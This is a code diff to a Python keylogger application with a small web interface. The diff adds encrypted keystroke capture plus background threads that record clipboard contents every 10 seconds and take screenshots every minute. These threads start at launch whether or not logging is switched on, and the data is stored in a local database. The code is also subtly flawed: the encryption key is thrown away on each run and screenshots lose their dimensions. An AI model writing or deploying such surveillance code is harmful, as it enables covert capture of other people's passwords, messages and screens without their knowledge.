@@ -2,12 +2,24 @@ import eel
 from pynput import keyboard
 import sqlite3
 from datetime import datetime
-import csv
+import threading
 import os
+import base64
+from cryptography.fernet import Fernet
+import pyperclip
+import pyautogui
+import time
 
-# Global variable to control keylogging
+# Initialize Eel
+eel.init("web")
+
+# Global control
 is_logging = False
-session_id = None
+key_listener = None
+
+# Encryption key (generated once, store safely in real scenario)
+fernet_key = Fernet.generate_key()
+cipher = Fernet(fernet_key)
 
 # Database setup
 def setup_database():
@@ -17,103 +29,102 @@ def setup_database():
         CREATE TABLE IF NOT EXISTS keystrokes (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
             key_pressed TEXT,
-            timestamp DATETIME,
-            session_id INTEGER
+            timestamp DATETIME
+        )
+    ''')
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS clipboard (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            content TEXT,
+            timestamp DATETIME
+        )
+    ''')
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS screenshots (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            image BLOB,
+            timestamp DATETIME
         )
     ''')
     conn.commit()
     conn.close()
 
-# Call setup on startup
 setup_database()
 
-# Function to handle key press events
+# Log clipboard content
+def log_clipboard():
+    previous_clipboard = ""
+    while True:
+        try:
+            current = pyperclip.paste()
+            if current != previous_clipboard:
+                encrypted = cipher.encrypt(current.encode())
+                conn = sqlite3.connect('keystrokes.db')
+                cursor = conn.cursor()
+                cursor.execute("INSERT INTO clipboard (content, timestamp) VALUES (?, ?)", (encrypted, datetime.now()))
+                conn.commit()
+                conn.close()
+                previous_clipboard = current
+        except:
+            pass
+        time.sleep(10)  # Check every 10 seconds
+
+# Take screenshot
+def periodic_screenshot():
+    while True:
+        try:
+            screenshot = pyautogui.screenshot()
+            buffer = screenshot.tobytes()
+            encoded_image = base64.b64encode(buffer)
+            conn = sqlite3.connect('keystrokes.db')
+            cursor = conn.cursor()
+            cursor.execute("INSERT INTO screenshots (image, timestamp) VALUES (?, ?)", (encoded_image, datetime.now()))
+            conn.commit()
+            conn.close()
+        except:
+            pass
+        time.sleep(60)  # Every minute
+
+# Key press event
 def on_press(key):
     if is_logging:
         try:
             keystroke = key.char
         except AttributeError:
             keystroke = str(key)
+        try:
+            encrypted = cipher.encrypt(keystroke.encode())
+            conn = sqlite3.connect('keystrokes.db')
+            cursor = conn.cursor()
+            cursor.execute("INSERT INTO keystrokes (key_pressed, timestamp) VALUES (?, ?)", (encrypted, datetime.now()))
+            conn.commit()
+            conn.close()
+        except:
+            pass
 
-        if keystroke in ['Key.shift', 'Key.ctrl', 'Key.alt', 'Key.caps_lock']:
-            return
-
-        conn = sqlite3.connect('keystrokes.db')
-        cursor = conn.cursor()
-        cursor.execute('''
-            INSERT INTO keystrokes (key_pressed, timestamp, session_id)
-            VALUES (?, ?, ?)
-        ''', (keystroke, datetime.now(), session_id))
-        conn.commit()
-        conn.close()
-
-# Start keylogging
-def start_keylogger():
-    global is_logging, session_id
-    is_logging = True
-    session_id = int(datetime.now().timestamp())
-    print("Keylogging started. Session ID:", session_id)
-
-# Stop keylogging
-def stop_keylogger():
-    global is_logging
-    is_logging = False
-    print("Keylogging stopped.")
-
-# Export logs to CSV
-@eel.expose
-def export_to_csv():
-    conn = sqlite3.connect('keystrokes.db')
-    cursor = conn.cursor()
-    cursor.execute("SELECT * FROM keystrokes")
-    data = cursor.fetchall()
-    with open('keystrokes_export.csv', 'w', newline='') as f:
-        writer = csv.writer(f)
-        writer.writerow(['ID', 'Key Pressed', 'Timestamp', 'Session ID'])
-        writer.writerows(data)
-    conn.close()
-    print("Data exported to keystrokes_export.csv")
-
-# Get keystroke stats
-@eel.expose
-def get_stats():
-    conn = sqlite3.connect('keystrokes.db')
-    cursor = conn.cursor()
-    cursor.execute("SELECT key_pressed, COUNT(*) FROM keystrokes GROUP BY key_pressed ORDER BY COUNT(*) DESC")
-    stats = cursor.fetchall()
-    conn.close()
-    return stats
-
-# Get recent keystrokes
-@eel.expose
-def get_recent_keys():
-    conn = sqlite3.connect('keystrokes.db')
-    cursor = conn.cursor()
-    cursor.execute("SELECT key_pressed FROM keystrokes ORDER BY id DESC LIMIT 10")
-    keys = [row[0] for row in cursor.fetchall()]
-    conn.close()
-    return keys
-
-# Get current status
-@eel.expose
-def get_status():
-    return "Logging" if is_logging else "Idle"
-
-# Set up the keyboard listener
-listener = keyboard.Listener(on_press=on_press)
-listener.start()
-
-# Initialize Eel
-eel.init("web")
-
-# Expose Python functions to JavaScript
-@eel.expose
+# Start logging
 def start_logging():
-    start_keylogger()
+    global is_logging, key_listener
+    if not is_logging:
+        is_logging = True
+        key_listener = keyboard.Listener(on_press=on_press)
+        key_listener.start()
 
-@eel.expose
+# Stop logging
 def stop_logging():
-    stop_keylogger()
+    global is_logging, key_listener
+    is_logging = False
+    if key_listener is not None:
+        key_listener.stop()
+        key_listener = None
 
-# Start the Eel application with a larger window size
-eel.start("index.html", size=(800, 600))
+# Expose to frontend
+eel.expose(start_logging)
+eel.expose(stop_logging)
+
+# Background threads
+threading.Thread(target=log_clipboard, daemon=True).start()
+threading.Thread(target=periodic_screenshot, daemon=True).start()
+
+# Start web UI
+eel.start("index.html")
